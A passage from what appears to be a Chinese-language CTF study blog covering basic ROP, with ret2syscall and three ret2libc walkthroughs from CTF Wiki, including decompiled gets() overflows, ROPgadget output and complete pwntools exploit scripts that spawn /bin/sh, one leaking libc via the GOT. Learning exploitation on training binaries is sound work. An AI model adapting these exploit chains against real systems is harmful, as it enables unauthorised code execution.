80h）</li></ul></li><li><p>比如<code>execve(&quot;/bin/sh&quot;,null,null)</code>这个函数，其函数调用过程为：</p><ul><li>系统调用号，即 eax 应该为 0xb </li><li>第一个参数，即 ebx 应该指向 &#x2F;bin&#x2F;sh 的地址，其实执行 sh 的地址也可以。</li><li>第二个参数，即 ecx 应该为 0 </li><li>第三个参数，即 edx 应该为 0</li></ul></li></ul><p>通过ROP控制程序执行系统调用，获取 shell，通过系统调用来获取 shell 就需要把系统调用的参数放入各个寄存器，然后执行 int 0x80 指令</p><h3 id="示例复现-2"><a href="#示例复现-2" class="headerlink" title="示例复现"></a>示例复现</h3><p>题目来源：ctf_wiki</p><p>查看保护</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>开了NX保护，32位 </p><p>IDA查看源码</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [esp+1Ch] [ebp-64h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;This time, no system() and NO SHELLCODE!!!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What do you plan to do?&quot;</span>);</span><br><span class="line">  gets(&amp;v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>能够看到是栈溢出，和前面做法类似，算出要覆盖的返回地址相对于v4的偏移为112。</p><p>由于不能直接利用程序中的某一段代码或者是自己填写的代码来获得shell，所以可以尝试利用程序中的gadgets来获得shell，而获得对应shell是利用系统调用实现的。</p><p>利用<code>execve(&quot;/bin/sh&quot;,NULL,NULL)</code>，那么就需要控制寄存器的值，需要使用的gadgets。一般来说不会有连续的代码可以同时控制对应的寄存器，所以需要一段一段地控制对应的寄存器，这也就是为什么要在gadgets最后使用ret来再次控制程序流程的原因。</p><p>寻找 gadgets 可以使用 ropgadgets 这个工具</p><p>首先寻找控制eax的gadgets，<code>ROPgadget --binary ./ret2syscall --only &quot;pop|ret&quot; | grep &quot;eax&quot;</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">giantbranch@ubuntu:~/Desktop/CTF$ ROPgadget --binary ./ret2syscall --only &quot;pop|ret&quot; | grep &quot;eax&quot;</span><br><span class="line">0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x080bb196 : pop eax ; ret</span><br><span class="line">0x0807217a : pop eax ; ret 0x80e</span><br><span class="line">0x0804f704 : pop eax ; ret 3</span><br><span class="line">0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br></pre></td></tr></table></figure><p>可以看到上述几个都可以控制eax，这里选取第二个来作为gadgets</p><p>同理可以得到控制其他寄存器的gadgets，<code>ROPgadget --binary ./ret2syscall --only &quot;pop|ret&quot; | grep &quot;ebx&quot; | grep &quot;ecx&quot; | grep &quot;edx&quot;</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">giantbranch@ubuntu:~/Desktop/CTF$ ROPgadget --binary ./ret2syscall --only &quot;pop|ret&quot; | grep &quot;ebx&quot; | grep &quot;ecx&quot; | grep &quot;edx&quot; </span><br><span class="line">0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret</span><br></pre></td></tr></table></figure><p>然后我们还需要获得&#x2F;bin&#x2F;sh字符串对应的地址，<code>ROPgadget --binary ./ret2syscall --string &quot;/bin/sh&quot;</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">giantbranch@ubuntu:~/Desktop/CTF$ ROPgadget --binary ./ret2syscall --string &quot;/bin/sh&quot;</span><br><span class="line">Strings information</span><br><span class="line">============================================================</span><br><span class="line">0x080be408 : /bin/sh</span><br></pre></td></tr></table></figure><p>找到int 0x80的地址</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">giantbranch@ubuntu:~/Desktop/CTF$ ROPgadget --binary ./ret2syscall --only &quot;int&quot;|grep &quot;0x80&quot;</span><br><span class="line">0x08049421 : int 0x80</span><br></pre></td></tr></table></figure><p>exp：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./ret2syscall&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_eax_ret = <span class="number">0x080bb196</span></span><br><span class="line">pop_edx_ecx_ebx_ret = <span class="number">0x0806eb90</span></span><br><span class="line">int_0x80 = <span class="number">0x08049421</span></span><br><span class="line">binsh = <span class="number">0x80be408</span></span><br><span class="line">payload = flat(</span><br><span class="line">    [<span class="string">&#x27;A&#x27;</span> * <span class="number">112</span>, pop_eax_ret, <span class="number">0xb</span>, pop_edx_ecx_ebx_ret, <span class="number">0</span>, <span class="number">0</span>, binsh, int_0x80])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h2><h3 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h3><p>如果目标程序调用的函数较少，或者使用动态编译，导致可用的gadgets变少，就无法达到利用效果，那么就可以到动态链接库中寻找gadgets。</p><p>控制函数执行libc中的函数，一般是返回至某个函数的plt处或者函数的具体位置，比如要执行system(“&#x2F;bin&#x2F;sh”)，就需要知道system函数的地址</p><h4 id="libc泄露"><a href="#libc泄露" class="headerlink" title="libc泄露"></a>libc泄露</h4><p>如果题目源码中既没有找到system函数，也没有找到‘&#x2F;bin&#x2F;sh’，那么就需要用到libc泄露。这时候就可以利用在栈溢出之前执行过的函数来泄露libc的版本。因为libc函数相对于libc的基地址都是确定的，即函数之间相对偏移是固定的，即便程序有ASLR保护，也只是针对地址中间位进行随机，最低的12位并不会发生改变，github上有人对libc进行了收集：</p><p><a href="https://github.com/niklasb/libc-database">niklasb&#x2F;libc-database: Build a database of libc offsets to simplify exploitation (github.com)</a></p><p>常用的办法是GOT表泄露，输出某个函数对应的got表项内容，由于延迟绑定机制，需要泄露已经执行过的函数的地址。</p><h3 id="示例复现1"><a href="#示例复现1" class="headerlink" title="示例复现1"></a>示例复现1</h3><p>题目来源：ctf-wiki</p><p>检查保护</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>32位，NX保护开启</p><p>IDA查看源码</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">100</span>]; <span class="comment">// [esp+1Ch] [ebp-64h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;RET2LIBC &gt;_&lt;&quot;</span>);</span><br><span class="line">  gets(s);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>gets函数，有栈溢出，能看到有个secure函数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">secure</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> input; <span class="comment">// [esp+18h] [ebp-10h] BYREF</span></span><br><span class="line">  <span class="type">int</span> secretcode; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v0 = time(<span class="number">0</span>);</span><br><span class="line">  srand(v0);</span><br><span class="line">  secretcode = rand();</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;input);</span><br><span class="line">  <span class="keyword">if</span> ( input == secretcode )</span><br><span class="line">    system(<span class="string">&quot;shell!?&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是system函数里面的参数并不是&#x2F;bin&#x2F;sh，如果单纯的将返回地址覆盖为system函数的地址并执行，那么会产生错误，因为shell!?不是一个系统命令，所以需要让system的参数变为&#x2F;bin&#x2F;sh。</p><p>程序调用system函数时，会自动寻找ebp指向的位置，然后将ebp+8的位置的数据当作函数的参数，那么如果要将&#x2F;bin&#x2F;sh作为system函数的参数，可以利用栈溢出，修改eip为system函数地址后，填充4个字节的垃圾数据，然后将&#x2F;bin&#x2F;sh的地址作为参数。</p><p>找到system函数的地址：</p><p><img src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312211845348.png" alt="image-20230714185218657"></p><p>注意要找的是plt的</p><p>&#x2F;bin&#x2F;sh地址为：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">giantbranch@ubuntu:~/Desktop/CTF$ ROPgadget --binary ./ret2libc1 --string &quot;/bin/sh&quot;</span><br><span class="line">Strings information</span><br><span class="line">============================================================</span><br><span class="line">0x08048720 : /bin/sh</span><br></pre></td></tr></table></figure><p>依照前面的方法确定栈溢出大小为112。</p><p>exp</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./ret2libc1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">binsh_addr = <span class="number">0x8048720</span></span><br><span class="line">system_plt = <span class="number">0x08048460</span></span><br><span class="line">payload = flat([<span class="string">&#x27;a&#x27;</span> * <span class="number">112</span>, system_plt,<span class="string">&#x27;b&#x27;</span>*<span class="number">4</span>,binsh_addr])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h3 id="示例复现2"><a href="#示例复现2" class="headerlink" title="示例复现2"></a>示例复现2</h3><p>检查保护</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>32位开了NX保护</p><p>查看源码</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">100</span>]; <span class="comment">// [esp+1Ch] [ebp-64h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Something surprise here, but I don&#x27;t think it will work.&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;What do you think ?&quot;</span>);</span><br><span class="line">  gets(s);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">secure</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> input; <span class="comment">// [esp+18h] [ebp-10h] BYREF</span></span><br><span class="line">  <span class="type">int</span> secretcode; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v0 = time(<span class="number">0</span>);</span><br><span class="line">  srand(v0);</span><br><span class="line">  secretcode = rand();</span><br><span class="line">  __isoc99_scanf(&amp;unk_8048760, &amp;input);</span><br><span class="line">  <span class="keyword">if</span> ( input == secretcode )</span><br><span class="line">    system(<span class="string">&quot;no_shell_QQ&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>明显的栈溢出，并且secure函数中有system函数，并且通过查找字符串等并没有发现&#x2F;bin&#x2F;sh的存在，那么就需要自己写一个&#x2F;bin&#x2F;sh作为system函数的参数，让程序执行system(‘&#x2F;bin&#x2F;sh’)，从而控制程序。可以通过栈溢出将返回地址覆盖为gets函数的地址，然后再将bss段的地址作为函数的参数，将’&#x2F;bin&#x2F;sh’写入到bss段，然后把调用的gets函数的返回地址覆盖为system函数的地址，参数为写入到bss段的’&#x2F;bin&#x2F;sh’字符串的地址。</p><p>先找get函数和system函数的地址：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">giantbranch@ubuntu:~/Desktop/CTF$ objdump -dj .plt ret2libc2</span><br><span class="line"></span><br><span class="line">ret2libc2:     file format elf32-i386</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .plt:</span><br><span class="line"></span><br><span class="line">08048440 &lt;printf@plt-0x10&gt;:</span><br><span class="line"> 8048440:ff 35 04 a0 04 08    pushl  0x804a004</span><br><span class="line"> 8048446:ff 25 08 a0 04 08    jmp    *0x804a008</span><br><span class="line"> 804844c:00 00                add    %al,(%eax)</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">08048450 &lt;printf@plt&gt;:</span><br><span class="line"> 8048450:ff 25 0c a0 04 08    jmp    *0x804a00c</span><br><span class="line"> 8048456:68 00 00 00 00       push   $0x0</span><br><span class="line"> 804845b:e9 e0 ff ff ff       jmp    8048440 &lt;_init+0x24&gt;</span><br><span class="line"></span><br><span class="line">08048460 &lt;gets@plt&gt;:</span><br><span class="line"> 8048460:ff 25 10 a0 04 08    jmp    *0x804a010</span><br><span class="line"> 8048466:68 08 00 00 00       push   $0x8</span><br><span class="line"> 804846b:e9 d0 ff ff ff       jmp    8048440 &lt;_init+0x24&gt;</span><br><span class="line"></span><br><span class="line">08048470 &lt;time@plt&gt;:</span><br><span class="line"> 8048470:ff 25 14 a0 04 08    jmp    *0x804a014</span><br><span class="line"> 8048476:68 10 00 00 00       push   $0x10</span><br><span class="line"> 804847b:e9 c0 ff ff ff       jmp    8048440 &lt;_init+0x24&gt;</span><br><span class="line"></span><br><span class="line">08048480 &lt;puts@plt&gt;:</span><br><span class="line"> 8048480:ff 25 18 a0 04 08    jmp    *0x804a018</span><br><span class="line"> 8048486:68 18 00 00 00       push   $0x18</span><br><span class="line"> 804848b:e9 b0 ff ff ff       jmp    8048440 &lt;_init+0x24&gt;</span><br><span class="line"></span><br><span class="line">08048490 &lt;system@plt&gt;:</span><br><span class="line"> 8048490:ff 25 1c a0 04 08    jmp    *0x804a01c</span><br><span class="line"> 8048496:68 20 00 00 00       push   $0x20</span><br><span class="line"> 804849b:e9 a0 ff ff ff       jmp    8048440 &lt;_init+0x24&gt;</span><br><span class="line"></span><br><span class="line">080484a0 &lt;__gmon_start__@plt&gt;:</span><br><span class="line"> 80484a0:ff 25 20 a0 04 08    jmp    *0x804a020</span><br><span class="line"> 80484a6:68 28 00 00 00       push   $0x28</span><br><span class="line"> 80484ab:e9 90 ff ff ff       jmp    8048440 &lt;_init+0x24&gt;</span><br><span class="line"></span><br><span class="line">080484b0 &lt;srand@plt&gt;:</span><br><span class="line"> 80484b0:ff 25 24 a0 04 08    jmp    *0x804a024</span><br><span class="line"> 80484b6:68 30 00 00 00       push   $0x30</span><br><span class="line"> 80484bb:e9 80 ff ff ff       jmp    8048440 &lt;_init+0x24&gt;</span><br><span class="line"></span><br><span class="line">080484c0 &lt;__libc_start_main@plt&gt;:</span><br><span class="line"> 80484c0:ff 25 28 a0 04 08    jmp    *0x804a028</span><br><span class="line"> 80484c6:68 38 00 00 00       push   $0x38</span><br><span class="line"> 80484cb:e9 70 ff ff ff       jmp    8048440 &lt;_init+0x24&gt;</span><br><span class="line"></span><br><span class="line">080484d0 &lt;setvbuf@plt&gt;:</span><br><span class="line"> 80484d0:ff 25 2c a0 04 08    jmp    *0x804a02c</span><br><span class="line"> 80484d6:68 40 00 00 00       push   $0x40</span><br><span class="line"> 80484db:e9 60 ff ff ff       jmp    8048440 &lt;_init+0x24&gt;</span><br><span class="line"></span><br><span class="line">080484e0 &lt;rand@plt&gt;:</span><br><span class="line"> 80484e0:ff 25 30 a0 04 08    jmp    *0x804a030</span><br><span class="line"> 80484e6:68 48 00 00 00       push   $0x48</span><br><span class="line"> 80484eb:e9 50 ff ff ff       jmp    8048440 &lt;_init+0x24&gt;</span><br><span class="line"></span><br><span class="line">080484f0 &lt;__isoc99_scanf@plt&gt;:</span><br><span class="line"> 80484f0:ff 25 34 a0 04 08    jmp    *0x804a034</span><br><span class="line"> 80484f6:68 50 00 00 00       push   $0x50</span><br><span class="line"> 80484fb:e9 40 ff ff ff       jmp    8048440 &lt;_init+0x24&gt;</span><br></pre></td></tr></table></figure><p>找到bss段的地址</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.bss:0804A080                               public buf2</span><br><span class="line">.bss:0804A080                               ; char buf2[100]</span><br><span class="line">.bss:0804A080 ?? ?? ?? ?? ?? ?? ?? ?? ?? ??+buf2 db 64h dup(?)</span><br><span class="line">.bss:0804A080 ?? ?? ?? ?? ?? ?? ?? ?? ?? ??+_bss ends</span><br></pre></td></tr></table></figure><p>再用<code>gdb-&gt;start-&gt;vmmap</code>查看bss段是否可执行：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  Start       End    Perm     Size             Offset File</span><br><span class="line">0x804a000  0x804b000 rw-p     1000   1000 /home/hno/Desktop/CTF/ret2libc3</span><br></pre></td></tr></table></figure><p>除此以外，还有另一种构建payload的办法，利用ebx来传递参数，那么就需要寻找对应的gadgets：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">giantbranch@ubuntu:~/Desktop/CTF$ ROPgadget --binary ret2libc2 --only &#x27;pop|ret&#x27;</span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x0804872f : pop ebp ; ret</span><br><span class="line">0x0804872c : pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x0804843d : pop ebx ; ret</span><br><span class="line">0x0804872e : pop edi ; pop ebp ; ret</span><br><span class="line">0x0804872d : pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x08048426 : ret</span><br><span class="line">0x0804857e : ret 0xeac1</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 7</span><br></pre></td></tr></table></figure><p>接下来就是构建payload</p><p>一个办法是：</p><table><thead><tr><th>‘a’*112</th><th>填充</th></tr></thead><tbody><tr><td>gets_addr</td><td>返回到gets</td></tr><tr><td>sys_addr</td><td>gets返回地址，再次输入&#x2F;bin&#x2F;sh</td></tr><tr><td>bss_addr</td><td>gets写到什么地方，sys返回地址</td></tr><tr><td>bss_addr</td><td></td></tr></tbody></table><p>那么如果用第二种办法就是调用gets函数以后，把参数buf2给pop掉，这样的话返回地址就变成了system</p><p>exp</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./ret2libc2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">gets_plt = <span class="number">0x08048460</span></span><br><span class="line">system_plt = <span class="number">0x08048490</span></span><br><span class="line">buf2 = <span class="number">0x804a080</span></span><br><span class="line">payload = flat(</span><br><span class="line">    [<span class="string">&#x27;a&#x27;</span> * <span class="number">112</span>, gets_plt, system_plt, buf2, buf2])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.sendline(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>或是：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=process(<span class="string">&#x27;./ret2libc2&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">gets_plt=<span class="number">0x8048460</span> </span><br><span class="line">system_plt=<span class="number">0x8048490</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">pop_ebx=<span class="number">0x0804843d</span> </span><br><span class="line">buf2=<span class="number">0x804a080</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">payload=flat([<span class="string">b&#x27;a&#x27;</span>*<span class="number">112</span>,gets_plt,pop_ebx,buf2,system_plt,<span class="number">0xdeadbeef</span>,buf2])</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="示例复现3"><a href="#示例复现3" class="headerlink" title="示例复现3"></a>示例复现3</h3><p>检查保护</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>查看源码</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">100</span>]; <span class="comment">// [esp+1Ch] [ebp-64h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;No surprise anymore, system disappeard QQ.&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Can you find it !?&quot;</span>);</span><br><span class="line">  gets(s);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>源码中找不到system函数和‘&#x2F;bin&#x2F;sh’的地址，那么就要用到前面提到过的libc泄露了</p><p>可以根据上述步骤先得到libc再在程序中查询偏移，然后获得system函数地址，可以利用工具：</p><p><a href="https://github.com/lieanu/LibcSearcher">lieanu&#x2F;LibcSearcher: glibc offset search for ctf. (github.com)</a></p><p>libc中也是有’&#x2F;bin&#x2F;sh’字符串的，所以可以一起获得。</p><p>这里泄露__libc_start_main函数，因为它是程序最初被执行的地方，思路如下：</p><ul><li>泄露__libc_start_main 地址</li><li>获取libc版本</li><li>获取system地址和&#x2F;bin&#x2F;sh地址</li><li>再次执行源程序</li><li>触发栈溢出执行system(‘&#x2F;bin&#x2F;sh’)</li></ul><p>先通过elf获得puts函数的plt表值，__libc_start_main的got表值，还有main函数的地址，用来第二次触发漏洞</p><p>再利用__libc_start_main得到的libc版本，通过LibcSearcher得到函数的偏移量</p><p>（有时候LibcSearcher不好使，可以用<a href="https://libc.blukat.me/?q=__libc_start_main_ret:e81">libc database search (blukat.me)</a>）</p><p>那么总的思路就是：</p><ul><li>通过第一次溢出，来将puts函数的PLT地址放到返回处，泄露出执行过的函数的GOT地址</li><li>将puts返回地址设置为_start函数</li><li>通过泄露的函数的GOT地址计算出libc中的system和&#x2F;bin&#x2F;sh地址</li><li>再次溢出将返回地址覆盖为泄露出来的system的地址</li></ul><p>exp：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line">sh = process(<span class="string">&#x27;./ret2libc3&#x27;</span>)</span><br><span class="line">ret2libc3 = ELF(<span class="string">&#x27;./ret2libc3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts_plt = ret2libc3.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">libc_start_main_got = ret2libc3.got[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">main = ret2libc3.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">112</span>+p32(puts_plt)+p32(main)+p32(libc_start_main_got)</span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;Can you find it !?&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">libc_start_main_addr = u32(sh.recv()[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;__libc_start_main&#x27;</span>, libc_start_main_addr)</span><br><span class="line">libcbase = libc_start_main_addr - libc.dump(<span class="string">&#x27;__libc_start_main&#x27;</span>)</span><br><span class="line">system_addr = libcbase + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh_addr = libcbase + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">104</span>+p32(system_addr)+<span class="string">&#x27;aaaa&#x27;</span>+p32(binsh_addr)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><p><a href="https://www.yuque.com/hxfqg9/bin/ug9gx5">Basic-ROP (yuque.com)</a></p></li><li><p><a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/">基本 ROP - CTF Wiki (ctf-wiki.org)</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
